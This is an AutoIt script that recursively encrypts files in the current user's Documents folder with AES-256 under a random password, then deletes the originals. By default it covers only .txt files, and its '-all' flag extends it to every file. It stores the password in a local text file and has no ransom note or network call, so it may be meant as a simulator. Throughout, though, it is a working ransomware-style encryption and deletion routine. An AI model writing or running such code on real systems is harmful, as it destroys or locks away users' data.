#include <Crypt.au3>
#include <File.au3>
#include <Array.au3>
#include <StringConstants.au3>
#include <MsgBoxConstants.au3>
#include <GUIConstantsEx.au3>
#include <Date.au3>

; Set the folder path to current user's Documents directory
Local $folderPath = @MyDocumentsDir
Local $passwordFilePath = @ScriptDir & "\\encryption_password.txt"
Local $logFilePath = @ScriptDir & "\\encryption_log.txt"
Local $encryptAllFiles = False

; Check for -all flag
For $i = 1 To $CmdLine[0]
    If $CmdLine[$i] = "-all" Then
        $encryptAllFiles = True
        ExitLoop
    EndIf
Next

; Function to log messages
Func LogMessage($message)
    Local $timestamp = _NowCalc()
    Local $logEntry = $timestamp & " - " & $message & @CRLF
    FileWrite($logFilePath, $logEntry)
    ConsoleWrite($logEntry) ; Also write to console for immediate feedback
EndFunc

; Generate a strong random password (16 characters)
Local $password = ""
Local $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
For $i = 1 To 16
    $password &= StringMid($chars, Random(1, StringLen($chars), 1), 1)
Next

LogMessage("Encryption process started for directory: " & $folderPath)

; Function to recursively encrypt files in a directory
Func EncryptFiles($directory)
    Local $search = FileFindFirstFile($directory & "\\*")
    If $search = -1 Then
        LogMessage("No files found in: " & $directory)
        Return 0
    EndIf

    Local $file, $filePath, $encryptedCount = 0
    While 1
        $file = FileFindNextFile($search)
        If @error Then ExitLoop

        $filePath = $directory & "\\" & $file

        ; If it's a directory, recursively encrypt its contents
        If StringInStr(FileGetAttrib($filePath), "D") Then
            $encryptedCount += EncryptFiles($filePath)
            ContinueLoop
        EndIf

        ; Skip already encrypted files and system files
        If StringRight($file, 10) = ".encrypted" Or StringInStr(FileGetAttrib($filePath), "S") Then
            LogMessage("Skipped: " & $filePath)
            ContinueLoop
        EndIf

        ; Check if the file should be encrypted
        If Not $encryptAllFiles And StringRight($file, 4) <> ".txt" Then
            LogMessage("Skipped non-txt file: " & $filePath)
            ContinueLoop
        EndIf

        LogMessage("Attempting to encrypt: " & $filePath)

        Local $fileContent = FileRead($filePath)
        If @error Then
            LogMessage("Error: Failed to read file: " & $filePath & " (Error code: " & @error & ")")
            ContinueLoop
        EndIf

        ; Encrypt the file content
        Local $encryptedContent = _Crypt_EncryptData($fileContent, $password, $CALG_AES_256)

        If @error Then
            LogMessage("Error: Failed to encrypt file: " & $filePath & " (Error code: " & @error & ")")
            ContinueLoop
        EndIf

        ; Write the encrypted content back to the file
        If FileWrite($filePath & ".encrypted", $encryptedContent) Then
            ; Delete the original file
            If FileDelete($filePath) Then
                $encryptedCount += 1
                LogMessage("Successfully encrypted and deleted original: " & $filePath)
            Else
                LogMessage("Error: Encrypted but failed to delete original: " & $filePath & " (Error code: " & @error & ")")
            EndIf
        Else
            LogMessage("Error: Failed to write encrypted file: " & $filePath & " (Error code: " & @error & ")")
        EndIf
    WEnd

    FileClose($search)
    Return $encryptedCount
EndFunc

; Encrypt files in the current user's Documents directory
Local $encryptedCount = EncryptFiles($folderPath)

; Save password to file
If FileWrite($passwordFilePath, $password) Then
    LogMessage("Password saved to file: " & $passwordFilePath)
Else
    LogMessage("Error: Failed to save password to file (Error code: " & @error & ")")
EndIf

; Display success message and password
If $encryptedCount > 0 Then
    LogMessage($encryptedCount & " file(s) encrypted successfully")
    ConsoleWrite(@CRLF & "Encryption Complete" & @CRLF)
    ConsoleWrite($encryptedCount & " file(s) in " & $folderPath & " have been encrypted." & @CRLF & @CRLF)
    ConsoleWrite("The encryption password is: " & $password & @CRLF)
    ConsoleWrite("This password has also been saved to: " & $passwordFilePath & @CRLF)
Else
    LogMessage("Error: No files were encrypted")
    ConsoleWrite(@CRLF & "Error: No files were encrypted. Please check the log for details." & @CRLF)
EndIf

LogMessage("Encryption process completed")